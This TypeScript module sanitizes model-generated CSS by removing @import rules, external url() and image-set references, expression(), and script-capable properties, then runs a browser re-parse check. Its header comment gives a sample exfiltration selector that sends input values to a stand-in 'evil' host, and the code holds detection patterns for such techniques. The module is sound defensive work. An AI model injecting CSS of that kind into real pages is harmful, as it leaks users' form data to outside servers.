/**
 * Clean up CSS produced by a model before it is shown or applied.
 *
 * Why: CSS can leak page data to remote servers (e.g. `input[value^="a"] { background: url(https://evil/a) }`)
 * and can pull remote resources. Generated CSS must therefore never reference anything outside the page.
 *
 * How: parse with css-tree, find unsafe nodes, and delete their source ranges from the original text
 * (so the model's formatting and comments survive). Repeat until clean. In a browser, a final pass
 * re-parses with the real CSS engine and rejects anything that still references an external resource.
 */
import type { CssNode } from "css-tree";
// Subpath imports keep the bundle small: the main entry also pulls in the lexer and its syntax data.
import parse from "css-tree/parser";
import walk from "css-tree/walker";
import { parseFences, pickBlock } from "./fences";

export interface SanitizeResult {
  css: string;
  warnings: string[];
}

/** Pull the stylesheet out of a model response (handles ```css fences, even unterminated while streaming). */
export function extractCss(text: string): string {
  const { blocks } = parseFences(text);
  const block = pickBlock(blocks, ["css", ""]);
  if (block) return block.body.trim() ? block.body.trimEnd() + "\n" : "";
  if (blocks.length) return ""; // only non-CSS blocks (e.g. the JSON tokens) so far
  return text.trim() ? text.trim() + "\n" : "";
}

/** Decode CSS escapes (`\75` → `u`, `\-` → `-`) so obfuscated names can't hide. */
export function decodeEscapes(value: string): string {
  return value.replace(/\\(?:([0-9a-f]{1,6})[ \t\n\r\f]?|([^\n0-9a-f]))/gi, (_, hex: string | undefined, char: string | undefined) => {
    if (hex) {
      const code = Number.parseInt(hex, 16);
      return code > 0 && code <= 0x10ffff ? String.fromCodePoint(code) : "�";
    }
    return char ?? "";
  });
}

const RESOURCE_FUNCTIONS = /^(?:-webkit-)?(?:image-set|image|cross-fade|src|element)$/i;
const SCRIPT_PROPERTIES = /^(?:-moz-binding|behavior)$/i;
const SUSPICIOUS_RAW = /\\|url|image|src\s*\(|expression|\/\/|@import/i;

function isSafeTarget(target: string): boolean {
  const value = target.trim();
  return value === "" || /^data:/i.test(value) || value.startsWith("#");
}

interface Range {
  start: number;
  end: number;
}

interface Finding {
  range: Range;
  warning: string;
}

function rangeOf(node: CssNode | null | undefined): Range | null {
  const loc = node?.loc;
  return loc ? { start: loc.start.offset, end: loc.end.offset } : null;
}

/** Locate unsafe parts of the stylesheet. Each finding names the source range to delete. */
function findUnsafe(css: string): Finding[] {
  const findings: Finding[] = [];
  const ast = parse(css, { positions: true, parseCustomProperty: true });

  walk(ast, function (node) {
    // The enclosing declaration, at-rule or rule; deleting it is the smallest safe unit.
    const container = this.declaration ?? this.atrule ?? this.rule ?? node;
    const add = (warning: string, target: CssNode | null = container) => {
      const range = rangeOf(target);
      if (range) findings.push({ range, warning });
    };

    switch (node.type) {
      case "Atrule": {
        const name = decodeEscapes(node.name).toLowerCase();
        if (name === "import") add("Removed @import rules.", node);
        else if (node.name.includes("\\")) add("Removed an obfuscated at-rule.", node);
        break;
      }
      case "Url":
        if (!isSafeTarget(node.value)) add("Removed external url() references.");
        break;
      case "Function": {
        const name = decodeEscapes(node.name).toLowerCase();
        if (name === "url" || name === "expression" || name.includes("\\")) {
          add(name === "expression" ? "Removed expression()." : "Removed external url() references.");
        }
        break;
      }
      case "String":
        if (this.function && RESOURCE_FUNCTIONS.test(decodeEscapes(this.function.name)) && !isSafeTarget(node.value)) {
          add(`Removed external ${this.function.name}() references.`);
        }
        break;
      case "Declaration":
        if (SCRIPT_PROPERTIES.test(decodeEscapes(node.property))) add("Removed script-capable properties.", node);
        break;
      case "Raw":
        // Text css-tree couldn't parse. A browser may still read it, so anything that looks
        // like a resource reference or uses escapes is removed.
        if (SUSPICIOUS_RAW.test(node.value)) add("Removed unparseable CSS that looked like an external reference.");
        break;
    }
  });
  return findings;
}

function deleteRanges(css: string, ranges: Range[]): string {
  const sorted = [...ranges].sort((a, b) => a.start - b.start);
  const merged: Range[] = [];
  for (const range of sorted) {
    const last = merged[merged.length - 1];
    if (last && range.start <= last.end) last.end = Math.max(last.end, range.end);
    else merged.push({ ...range });
  }
  let out = css;
  for (const { start, end } of merged.reverse()) out = out.slice(0, start) + out.slice(end);
  return out;
}

/** In a browser, check what the real CSS engine sees. Returns null when the check can't run. */
function browserFindsExternal(css: string): boolean | null {
  if (typeof CSSStyleSheet === "undefined" || !("replaceSync" in CSSStyleSheet.prototype)) return null;
  try {
    const sheet = new CSSStyleSheet();
    sheet.replaceSync(css);
    const serialized = Array.from(sheet.cssRules, (rule) => rule.cssText).join("\n");
    for (const match of serialized.matchAll(/url\(\s*(?:"([^"]*)"|'([^']*)'|([^)]*?))\s*\)/gi)) {
      if (!isSafeTarget(match[1] ?? match[2] ?? match[3] ?? "")) return true;
    }
    return /@import/i.test(serialized) || /image-set\([^)]*["']\s*(?:[a-z][\w+.-]*:|\/\/)(?!data:)/i.test(serialized);
  } catch {
    return null;
  }
}

const MAX_PASSES = 4;

export function sanitizeCss(raw: string): SanitizeResult {
  const warnings = new Set<string>();
  let css = raw;

  for (let pass = 0; pass < MAX_PASSES; pass++) {
    const findings = findUnsafe(css);
    if (!findings.length) {
      if (browserFindsExternal(css) === true) {
        return {
          css: "",
          warnings: [...warnings, "Rejected the stylesheet: the browser still found external references after cleaning."],
        };
      }
      return { css: css.replace(/\n{3,}/g, "\n\n"), warnings: [...warnings] };
    }
    for (const finding of findings) warnings.add(finding.warning);
    css = deleteRanges(css, findings.map((f) => f.range));
  }

  return { css: "", warnings: [...warnings, "Rejected the stylesheet: it could not be cleaned safely."] };
}
